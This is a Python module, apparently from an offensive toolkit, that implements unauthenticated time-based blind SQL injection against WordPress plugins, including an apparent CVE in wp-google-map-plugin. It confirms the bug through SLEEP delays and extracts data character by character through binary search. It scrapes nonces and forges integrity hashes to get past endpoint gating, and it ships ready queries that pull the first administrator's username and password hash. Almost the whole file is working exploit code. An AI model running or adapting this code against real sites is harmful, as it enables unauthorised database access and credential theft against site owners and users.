"""Unauthenticated time-based blind SQL injection — confirm + bounded extract.

Unlike the webshell recipes, a SQLi's success criterion isn't a planted shell:
it's proof that attacker-controlled SQL executed. For a *time-based blind* bug
(e.g. wp-google-map-plugin CVE-2026-2580, the `orderby` sink in the AJAX
tabular listing) that proof is a measurable delay — an injected SLEEP(n) makes
the response ~n seconds slower than a no-sleep control.

`confirm()` establishes the vuln from that delta. `extract()` then reads a
scalar (e.g. the first admin's user_login / password hash) one character at a
time via binary search on each byte — REAL but slow and noisy (several delayed
requests per character), so callers run it deliberately, never in a fast sweep.

A recovered password *hash* is not a plaintext: it still needs offline cracking
before it can feed the credential attack. This module does not pretend otherwise.
"""
import hashlib
import time

from . import exploit as _exploit  # reuse the JS-nonce scraper

_ASCII_HI = 127


def _timed(base_url, http, recipe, cond, sleep):
    """Send one request with the payload built for (cond, sleep); return elapsed
    seconds, or None on transport error."""
    url = base_url.rstrip("/") + recipe["endpoint"]
    payload = recipe["payload"].format(cond=cond, sleep=sleep)
    method = recipe.get("method", "GET").upper()
    params = dict(recipe.get("params") or {})
    data = dict(recipe.get("data") or {})
    # Where the injected param rides. Default: body for POST, query for GET. But a
    # sink can read $_GET even on a POST request (wp-google-map-plugin reads
    # $_GET['orderby'] while the ajax dispatch itself is POST) — 'inject_in' lets
    # a recipe say so explicitly.
    inject_in = recipe.get("inject_in") or ("data" if method == "POST" else "params")
    bucket = data if inject_in == "data" else params
    bucket[recipe["inject_param"]] = payload
    # Some endpoints gate the injected param behind an integrity companion whose
    # value is a hash of the injected value itself (WP Automatic csv.php requires
    # integ == md5(q)). Compute it AFTER placing the payload and per request, since
    # the injected query changes every call (cond/sleep vary) — a static value
    # would only ever match one request. Rides in the same bucket as the payload.
    integ = recipe.get("integrity")
    if integ:
        digest = hashlib.new(integ.get("algo", "md5"),
                             bucket[recipe["inject_param"]].encode()).hexdigest()
        bucket[integ["param"]] = digest
    t0 = time.monotonic()
    try:
        if method == "POST":
            http.post(url, params=params, data=data)
        else:
            http.get(url, params=params)
    except Exception:
        return None
    return time.monotonic() - t0


def _resolve_nonce(base_url, http, recipe):
    """If the recipe's endpoint is nonce-gated, harvest the nonce once and return
    a recipe copy with it placed into params/data. Harvested once per confirm()/
    extract() (not per timed request) so it can't rotate mid-run. Returns the
    recipe unchanged when no nonce is needed or none is found — in the latter case
    the request simply fails the referer check and confirm() reports not-confirmed
    (fail-safe: a wrong/absent nonce never yields a false positive)."""
    nf = recipe.get("nonce_from")
    if not nf:
        return recipe
    nonce = _exploit._harvest_js_nonce(
        http, base_url.rstrip("/") + nf.get("url", "/"), nf["key"])
    if not nonce:
        return recipe
    bucket = nf.get("into", "data")
    out = dict(recipe)
    out[bucket] = dict(recipe.get(bucket) or {})
    out[bucket][nf.get("param", nf["key"])] = nonce
    return out


def confirm(base_url, http, recipe, delay=5, margin=1.5):
    """Confirm time-based blind SQLi. Injects SLEEP(delay) under a true
    condition and compares against a no-sleep control. Returns
    {confirmed, control_s, injected_s, delay} or None on transport error."""
    recipe = _resolve_nonce(base_url, http, recipe)
    control = _timed(base_url, http, recipe, recipe.get("false_cond", "1=2"), 0)
    injected = _timed(base_url, http, recipe, recipe.get("true_cond", "1=1"), delay)
    if control is None or injected is None:
        return None
    return {
        "confirmed": (injected - control) >= (delay - margin),
        "control_s": round(control, 3),
        "injected_s": round(injected, 3),
        "delay": delay,
    }


def _bit_true(base_url, http, recipe, cond, delay, margin):
    """Is `cond` true? True when the SLEEP(delay) fires (response is slow)."""
    t = _timed(base_url, http, recipe, cond, delay)
    if t is None:
        return None
    return t >= (delay - margin)


def _extract_char(base_url, http, recipe, expr, pos, delay, margin):
    """Binary-search one byte of expr at 1-based position pos. Returns the ASCII
    code (0 = end of string / NUL), or None on transport error."""
    lo, hi = 0, _ASCII_HI
    while lo < hi:
        mid = (lo + hi) // 2
        cond = f"ASCII(SUBSTRING(({expr}),{pos},1))>{mid}"
        gt = _bit_true(base_url, http, recipe, cond, delay, margin)
        if gt is None:
            return None
        if gt:
            lo = mid + 1
        else:
            hi = mid
    return lo


def extract(base_url, http, recipe, expr, length=32, delay=3, margin=1.0):
    """Recover a scalar SQL expression char-by-char (bounded by `length`).
    SLOW: ~7 delayed requests per character. Stops at the first NUL/empty."""
    recipe = _resolve_nonce(base_url, http, recipe)
    out = []
    for pos in range(1, length + 1):
        code = _extract_char(base_url, http, recipe, expr, pos, delay, margin)
        if code is None or code == 0:
            break
        out.append(chr(code))
    return "".join(out)


# Convenience SQL expressions for the usual targets.
ADMIN_LOGIN = ("SELECT user_login FROM wp_users u JOIN wp_usermeta m "
               "ON u.ID=m.user_id WHERE m.meta_key='wp_capabilities' "
               "AND m.meta_value LIKE '%administrator%' LIMIT 1")
ADMIN_HASH = ("SELECT user_pass FROM wp_users u JOIN wp_usermeta m "
              "ON u.ID=m.user_id WHERE m.meta_key='wp_capabilities' "
              "AND m.meta_value LIKE '%administrator%' LIMIT 1")
